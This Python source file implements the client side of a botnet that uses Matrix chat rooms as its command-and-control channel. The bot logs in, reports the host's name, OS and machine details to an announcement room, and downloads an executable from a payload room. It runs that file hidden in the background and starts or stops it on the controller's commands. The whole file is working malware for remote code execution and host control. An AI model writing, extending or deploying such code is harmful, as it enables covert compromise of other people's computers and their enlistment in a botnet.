import json
import platform
import random
import signal
import socket
import subprocess
import threading
import time
import uuid
from matrix_client.client import MatrixClient, Room
from matrix_client.api import MatrixRequestError
import requests
from requests.exceptions import MissingSchema
import os
import sys
from dotenv import load_dotenv
import atexit

load_dotenv()
USER_NAME = os.getenv('BOT_NAME')  
PASSWORD = os.getenv('BOT_PASSWORD')
ANNOUNCE_ROOM_ID = os.getenv('ANNOUNCE_ROOM_ID')
PAYLOAD_ROOM_ID = os.getenv('PAYLOAD_ROOM_ID')
MATRIX_HOMESERVER = "https://matrix.org"
MATRIX_DOWNLOAD_PREFIX = "https://matrix-client.matrix.org/_matrix/client/v1/media/download/"

class Payload:
    payload_path: str
    proc: subprocess.Popen
    running: bool

    def __init__(self, path):
        self.payload_path = path
        self.proc = None
        self.running = False

    def start(self):
        if self.running:
            return
        try:
            start_args = {
                'stdout': subprocess.DEVNULL,
                'stderr': subprocess.DEVNULL,
                'shell': True
            }

            if sys.platform == 'win32':
                start_args['creationflags'] = (
                    subprocess.CREATE_NEW_PROCESS_GROUP | # os.setsid doesn't exist on windows
                    subprocess.CREATE_NO_WINDOW # dont open terminal for process
                )
            else:
                start_args['preexec_fn'] = os.setsid

            self.proc = subprocess.Popen(self.payload_path, **start_args)
            self.running = True
            print("running payload")
        except Exception as e:
            print(e)
            return
    
    def stop(self):
        if not self.running:
            return
        try:
            if sys.platform == 'win32':
                subprocess.call(['taskkill', '/F', '/T', '/PID', str(self.proc.pid)])
            else:
                os.killpg(os.getpgid(self.proc.pid), signal.SIGKILL)
            print("stopped payload")
            self.running = False
            
        except Exception as e:
            print(e)

class Bot:
    access_token: str
    announce_room: Room = None
    command_room: Room = None
    
    announce_listener: uuid.UUID
    command_listener: uuid.UUID
    
    last_ping: float = 0
    ping_timeout_treshold: float = 40

    payload: Payload
    
    def __init__(self):
        self.got_room = False
        self.bot_id = str(uuid.uuid4())
        self.client = MatrixClient(MATRIX_HOMESERVER)
        
        self.room_lock = threading.RLock()  # for room state changes
        self.ping_lock = threading.Lock()   # for ping timing updates
        self.payload = None
    def login(self):
        # login and sync
        try:
            self.access_token = self.client.login(username=USER_NAME, password=PASSWORD)
            print("[+] Logged in as bot.")
        except MatrixRequestError as e:
            print(e)
            if e.code == 403:
                print("Bad username or password.")
                sys.exit(4)
            else:
                print("Check your sever details are correct.")
                sys.exit(2)
        except MissingSchema as e:
            print("Bad URL format.")
            print(e)
            sys.exit(3)
            
    def join_room(self, roomid) -> Room:
        # check if already joined, if not join the room
        try:
            room: Room = self.client.rooms[roomid]
        except KeyError:
            room: Room = self.client.join_room(roomid)
        return room
        
    def announce(self):
        self.announce_room.send_text(
            f"CONNECT:{self.get_system_info()}"
        )
        
    def stop(self):
        self.announce_room.send_text(
            f"DISCONNECT:{self.command_room.room_id}:{self.bot_id}"
        )
    
    def download_file(self, event, download_dir="downloads") -> str:
        content = event["content"]
        filename = content.get("body", "payload_file")
        download_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), download_dir)
        filepath = os.path.join(download_dir, filename)
        os.makedirs(download_dir, exist_ok=True)
        
        # extract server and media ID from mxc URL
        mxc_url = content['url']
        durl = MATRIX_DOWNLOAD_PREFIX + mxc_url[6:]
        
        # download 
        response = requests.get(durl, headers={"Authorization": f"Bearer {self.client.token}"})
        response.raise_for_status()
        
        # save 
        with open(filepath, 'wb') as f:
            f.write(response.content)
        
        print(f"Downloaded file: {filepath}")
        return filepath
        
    def download_payload(self):
        payload_event = self.client.api.get_room_messages(
            PAYLOAD_ROOM_ID,
            "",
            "b",
            limit=10
        )
        
        bin_name = "popup" 
        if sys.platform == "win32":
            bin_name += ".exe"
                
        for event in payload_event["chunk"]:
            content = event["content"]
            msg_type = content.get("msgtype", "")
            if msg_type == "m.image":
                self.download_file(event)
            elif msg_type == "m.file":
                if content.get("body", "") == bin_name:
                    path = self.download_file(event)
                    os.chmod(path, 0o755)  # Read & execute for all, write for owner
                    self.payload = Payload(path)

        
    def get_system_info(self) -> str:
        return json.dumps({
            "hostname": socket.gethostname(),
            "platform": platform.system(),
            "platform_version": platform.version(),
            "machine": platform.machine(),
            "bot_id": self.bot_id,
            "python_version": platform.python_version()
        })
        
    def on_announcement(self, room, event):
        # not good that bot can see other bot's messages
        msgbody: str = event["content"]["body"]
        if not msgbody.startswith("RESOLVE"):
            return
        
        botid, payload_status, roomid = msgbody.removeprefix("RESOLVE ").split(":", 2)
        if botid == self.bot_id:
            print("RESOLVING TO", roomid)
            with self.room_lock:
                self.got_room = True
                self.command_room = self.join_room(roomid)
                self.announce_room.remove_listener(self.announce_listener)
                self.command_listener = self.command_room.add_listener(self.on_command, event_type="m.room.message")
                if payload_status == "E":
                    self.payload.start()
            with self.ping_lock:
                self.last_ping = time.time()
                
    def on_command(self, room, event):
        msgbody: str = event["content"]["body"]
        _, command = msgbody.split(":", 1)
        if command == "PING":
            with self.room_lock:
                if not self.got_room:
                    return
                self.announce_room.send_text(
                    f"PONG:{self.command_room.room_id}:{self.bot_id}:{time.time()}"
                )
            with self.ping_lock:
                self.last_ping = time.time()
                
        elif command.startswith("CLEAR"):
            command, targets = command.split(":", 1)
            if targets == "ALL":
                print("RECEIVED ALL CLEAR")
                with self.room_lock:
                    self.command_room.leave()
                self.start_room_search()
            elif targets == self.bot_id:
                print("RECEIVED INDIVIDUAL CLEAR")
                self.start_room_search()

        elif command.startswith("PAYLOAD"):
            command, status = command.split(":", 1)
            if status == "START":
                self.payload.start()
            elif status == "STOP":
                self.payload.stop()

        elif command == "DISCONNECT":
            sys.exit(0)
        else:
            print(f"UNKNOWN: {msgbody}")
            
    def make_announcement_listener(self) -> uuid.UUID:
        if len(self.announce_room.listeners) == 0:
            return self.announce_room.add_listener(self.on_announcement, event_type="m.room.message")
        else:
            print("Already listening on announcement room")
            return self.announce_room.listeners[0]
    
    def check_pings(self):
        while True:
            should_restart = False
            time.sleep(self.ping_timeout_treshold)
            
            with self.ping_lock:
                current_time = time.time()
                ping_age = current_time - self.last_ping
                
            with self.room_lock:
                # didn't receive three pings -> controller went offline -> start searching again
                if self.got_room and ping_age > self.ping_timeout_treshold * 3:
                    print("controller offline, starting search again")
                    should_restart = True
                    
            if should_restart:
                self.start_room_search()
                    
    def start_room_search(self):
        with self.room_lock:
            self.got_room = False

            # clean up
            try:
                self.command_room.remove_listener(self.command_listener)
            except Exception as e:
                print(f"Error removing command listener: {e}")
            
            self.command_room = None
            self.command_listener = None
            
            # randomized backoff to prevent simultaneous reconnects
            time.sleep(random.uniform(1, 3))
            
            self.announce_listener = self.make_announcement_listener()
        
    def announcement_loop(self):
        while True:
            with self.room_lock:
                if not self.got_room:
                    self.announce()
            time.sleep(5)
            
    def run(self):
        self.login()
        self.announce_room = self.join_room(ANNOUNCE_ROOM_ID)
        # make sure joining and syncing is done before proceding
        time.sleep(1)
                
        self.client.start_listener_thread()
        
        self.download_payload()
        
        def exit_handler():
            self.stop()
        atexit.register(exit_handler)
        
        threading.Thread(name="PING THREAD", target=self.check_pings, daemon=True).start()
        
        self.start_room_search()
        self.announcement_loop()


if __name__ == "__main__":
    bot = Bot()
    bot.run()